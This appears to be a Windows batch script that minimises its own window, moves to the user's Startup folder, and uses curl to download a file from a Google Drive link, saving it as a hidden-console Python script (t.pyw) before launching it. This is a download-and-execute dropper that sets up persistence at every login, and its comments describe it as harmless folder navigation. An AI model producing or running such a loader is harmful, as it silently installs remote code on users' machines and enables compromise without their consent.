@echo off
if not defined MINIMIZED (
    set MINIMIZED=1
    start "" /min "%~dpnx0"
    exit
)

rem Navigate to the current user's Startup folder

rem Get the Startup folder path for the current user
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Navigate to the Startup folder
cd /d "%startupFolder%"

rem Display the current directory to confirm
echo You are now in the Startup folder:
curl -o t.pyw https://drive.usercontent.google.com/download?id=1gC89KsuuYYsGoVJKko68uwO-O2Cjteaa&export=download&authuser=0&confirm=t&uuid=e73a9c3b-7ffd-46a1-8a4f-977d0cd32740&at=ABswASaBoOE6FoBY9lPD2sDbk7Ni:1785270720679

start t.pyw

rem Optional: list the contents of the Startup folder
dir

exit
